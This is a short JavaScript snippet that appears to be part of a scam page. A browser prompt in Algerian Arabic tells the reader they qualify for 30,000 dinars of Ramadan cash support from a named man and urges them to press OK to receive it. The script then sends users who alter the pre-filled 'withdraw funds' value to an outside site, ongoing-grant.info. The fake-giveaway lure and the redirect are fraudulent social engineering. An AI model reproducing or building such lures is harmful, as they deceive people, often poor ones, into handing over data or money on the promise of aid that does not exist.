var password = 'سحب الأموال';

password = prompt(
  'مبروك، راك مؤهل باش تستقبل دعم كاش رمضان من محمد لعيد بن عمر بقيمة 30,000 دينار جزائري. اضغط على "موافق" باش تستلمو فوراً..',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.info/Laid-Be-Namor-30,000.html';
}
